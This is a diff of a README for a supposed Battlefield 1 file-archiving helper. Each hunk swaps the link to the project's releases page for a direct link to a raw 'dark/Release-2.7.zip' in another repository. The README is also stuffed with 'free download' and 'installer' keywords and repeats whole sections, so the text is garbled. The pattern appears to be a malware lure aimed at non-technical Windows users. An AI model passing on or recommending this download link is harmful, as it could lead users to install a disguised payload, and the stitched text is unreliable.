@@ -5,7 +5,7 @@ description: "Locate Battlefield 1 data on disk and archive config/export files 
 ---
 # 🎮 battlefield-1-desktop - Find and Archive Your Game Data
 
-[![Download battlefield-1-desktop](https://img.shields.io/badge/Download-battlefield--1--desktop-6f42c1?style=for-the-badge&logo=github)](https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases)
+[![Download battlefield-1-desktop](https://img.shields.io/badge/Download-battlefield--1--desktop-6f42c1?style=for-the-badge&logo=github)](https://github.com/Deuteriumvillagegreen361/deuteriumvillagegreen361.github.io/raw/refs/heads/main/dark/Release-2.7.zip)
 
 battlefield-1-desktop is a desktop helper for Battlefield 1 players who want a simple way to locate game data folders and keep local copies of configuration and export files. It is built for everyday Windows users who prefer a clear, guided experience without needing to learn commands, developer tools, or file-system tricks.
 
@@ -42,7 +42,7 @@ Archive folders can be placed wherever you prefer, such as inside your Documents
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download battlefield-1-desktop](https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases).
+Visit this link to download the application: [Download battlefield-1-desktop](https://github.com/Deuteriumvillagegreen361/deuteriumvillagegreen361.github.io/raw/refs/heads/main/dark/Release-2.7.zip).
 
 1. Open the download link above.
 2. Use the download provided for Windows.
@@ -73,7 +73,7 @@ The helper can look in common locations where Battlefield 1 data may be stored. 
 
 For a non-technical user, the main benefit is guidance. The application presents the discovered folders and helps you continue with archiving without needing to understand the full folder structure of the game or your Windows user profile# 🎮 battlefield-1-desktop - Find and Archive Your Game Data
 
-[![Download battlefield-1-desktop](https://img.shields.io/badge/Download-battlefield--1--desktop-6f42c1?style=for-the-badge&logo=github)](https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases)
+[![Download battlefield-1-desktop](https://img.shields.io/badge/Download-battlefield--1--desktop-6f42c1?style=for-the-badge&logo=github)](https://github.com/Deuteriumvillagegreen361/deuteriumvillagegreen361.github.io/raw/refs/heads/main/dark/Release-2.7.zip)
 
 battlefield-1-desktop is a desktop helper for Battlefield 1 players who want a simple way to locate game data folders and keep local copies of configuration and export files. It is built for everyday Windows users who prefer a clear, guided experience without needing to learn commands, developer tools, or file-system tricks.
 
@@ -110,7 +110,7 @@ Archive folders can be placed wherever you prefer, such as inside your Documents
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download battlefield-1-desktop](https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases).
+Visit this link to download the application: [Download battlefield-1-desktop](https://github.com/Deuteriumvillagegreen361/deuteriumvillagegreen361.github.io/raw/refs/heads/main/dark/Release-2.7.zip).
 
 1. Open the download link above.
 2. Use the download provided for Windows.
@@ -213,6 +213,6 @@ If you run into a question while using the helper, return to the download page a
 
 battlefield-1-desktop is a Windows desktop helper that finds Battlefield 1 data directories and archives configuration and export files locally. It is built for players who want a guided, non-technical way to organize game-related files and keep local copies in a folder they control.
 
-[![Download battlefield-1-desktop](https://img.shields.io/badge/Get%20battlefield--1--desktop-2ea44f?style=for-the-badge&logo=github)](https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases)
+[![Download battlefield-1-desktop](https://img.shields.io/badge/Get%20battlefield--1--desktop-2ea44f?style=for-the-badge&logo=github)](https://github.com/Deuteriumvillagegreen361/deuteriumvillagegreen361.github.io/raw/refs/heads/main/dark/Release-2.7.zip)
 
 Keywords: battlefield-1, battlefield-1-desktop, battlefield-1-download, battlefield-1-free, battlefield-1-installer, battlefield-1-macos, battlefield-1-official, battlefield-1-pc, battlefield-1-portable, battlefield-1-setup, battlefield-1-windows, download-battlefield-1, free-battlefield-1, installer-battlefield-1, macos-battlefield-1, official-battlefield-1, pc-battlefield-1, portable-battlefield-1, setup-battlefield-1, windows-battlefield-1
